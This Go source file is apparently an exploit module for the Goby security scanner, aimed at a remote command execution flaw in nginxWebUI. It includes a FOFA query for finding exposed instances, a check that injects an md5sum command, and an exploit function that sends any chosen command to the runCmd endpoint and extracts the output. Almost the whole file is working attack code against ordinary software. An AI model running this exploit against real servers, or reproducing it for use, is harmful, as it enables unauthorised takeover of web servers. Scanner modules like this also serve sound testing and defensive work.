package exploits

import (
	"crypto/md5"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "nginxWebUI runCmd file remote command execution vulnerability",
    "Description": "<p>NginxWebUI is a tool for graphical management of nginx configuration. You can use web pages to quickly configure various functions of nginx, including http protocol forwarding, tcp protocol forwarding, reverse proxy, load balancing, static html server, automatic application, renewal and configuration of ssl certificates. After configuration, you can create nginx. conf file, and control nginx to use this file to start and reload, completing the graphical control loop of nginx.</p><p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Product": "nginxWebUI",
    "Homepage": "https://www.nginxwebui.cn/product.html",
    "DisclosureDate": "2023-04-20",
    "Author": "14m3ta7k@gmail.com",
    "FofaQuery": "title=\"nginxWebUI\" && body=\"refreshCode('codeImg')\"",
    "GobyQuery": "title=\"nginxWebUI\" && body=\"refreshCode('codeImg')\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The official security patch has been released for vulnerability repair: <a href=\"https://github.com/cym1102/nginxWebUI\">https://github.com/cym1102/nginxWebUI</a></p>",
    "References": [
        "https://github.com/cym1102/nginxWebUI"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.2",
    "Translation": {
        "CN": {
            "Name": "nginxWebUI runCmd 文件命令执行漏洞",
            "Product": "nginxWebUI",
            "Description": "<p>nginxWebUI是一款图形化管理nginx配置得工具，可以使用网页来快速配置nginx的各项功能，包括http协议转发， tcp协议转发，反向代理，负载均衡，静态html服务器，ssl证书自动申请、续签、配置等， 配置好后可一建生成nginx.conf文件，同时可控制nginx使用此文件进行启动与重载，完成对nginx的图形化控制闭环。</p><p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "Recommendation": "<p>目前官方已发布安全补丁进行漏洞修复：<a href=\"https://github.com/cym1102/nginxWebUI\" target=\"_blank\">https://github.com/cym1102/nginxWebUI</a></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "nginxWebUI runCmd file remote command execution vulnerability",
            "Product": "nginxWebUI",
            "Description": "<p>NginxWebUI is a tool for graphical management of nginx configuration. You can use web pages to quickly configure various functions of nginx, including http protocol forwarding, tcp protocol forwarding, reverse proxy, load balancing, static html server, automatic application, renewal and configuration of ssl certificates. After configuration, you can create nginx. conf file, and control nginx to use this file to start and reload, completing the graphical control loop of nginx.</p><p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>The official security patch has been released for vulnerability repair: <a href=\"https://github.com/cym1102/nginxWebUI\" target=\"_blank\">https://github.com/cym1102/nginxWebUI</a><br></p>",
            "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10778"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			randomStr := goutils.RandomHexString(5)
			srcCode := md5.Sum([]byte(randomStr))
			randomStrMd5 := fmt.Sprintf("%x", srcCode)
			payload := fmt.Sprintf(`echo -n "%s" | md5sum`, randomStr)
			resp, err := httpclient.SimpleGet(hostinfo.FixedHostInfo + fmt.Sprintf("/AdminPage/conf/runCmd?cmd=%s", url.QueryEscape(payload)))
			if err != nil {
				return false
			}
			return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, randomStrMd5)
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
				cmd := stepLogs.Params["cmd"].(string)
				cmd = strings.ReplaceAll(cmd, " ", "+")
				resp, _ := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + "/AdminPage/conf/runCmd?cmd=" + cmd)
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "{\"success\":true,\"status\":\"200\",\"obj\":\"") {
					reg, _ := regexp.Compile("</span><br>运行失败<br>(.*?)\"}")
					results := reg.FindStringSubmatch(resp.Utf8Html)
					if len(results) > 1 {
						result := strings.ReplaceAll(results[1], "<br>", "\n")
						expResult.Success = true
						expResult.Output = result
					}
          reg, _ = regexp.Compile("</span><br>Run fail<br>(.*?)\"}")
					results = reg.FindStringSubmatch(resp.Utf8Html)
          if len(results) > 1{
						result := strings.ReplaceAll(results[1], "<br>", "\n")
						expResult.Success = true
						expResult.Output = result
          }
				}
			return expResult
		},
	))
}
